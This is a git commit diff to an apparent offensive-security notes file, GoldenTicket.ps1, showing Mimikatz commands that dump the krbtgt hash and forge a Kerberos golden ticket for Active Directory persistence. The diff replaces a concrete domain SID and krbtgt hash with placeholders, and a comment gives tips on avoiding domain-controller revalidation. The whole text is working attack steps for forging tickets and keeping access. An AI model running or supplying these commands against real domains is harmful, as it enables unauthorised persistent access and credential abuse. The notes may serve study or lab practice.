6de96e4bc8620230f45f0f05b22817479934e86a
qv1ntv5 <sanmillan.german@gmail.com>
2023-08-28 02:47:32 -0400

    COmmit

--- ActiveDirectory/PersistenceAD/GoldenTicket.ps1
+++ ActiveDirectory/PersistenceAD/GoldenTicket.ps1
@@ -15,10 +15,10 @@ lsadump::lsa /patch
 
 kerberos::purge
 
-# And with the Domain SID, NTLM krbtgt hash and krbtgt as username we perform the following command:
+# And with the Domain SID, NTLM krbtgt hash we perform the following command:
 
-kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+kerberos::golden /user:<USERNAME> /domain:corp.com /sid:<DomainSID> /krbtgt:<krbtgtNTLMhash> /ptt
 
 misc::cmd
 
-# It is important to note that we are indeed performing a OverPassTheHash attack taking advance from a NTLM hash to get a TGT ticket and because of this we have to be careful to do nothing that could lead to the domain controller to investigate our user an revalidate our permissions like using IPs instead of hostnames.
+# It is important to note that we are indeed performing a OverPassTheHash attack taking advance from a NTLM hash to get a TGT ticket and because of this we have to be careful to do nothing that could lead to the domain controller to investigate our user an revalidate our permissions like using IPs instead of hostnames
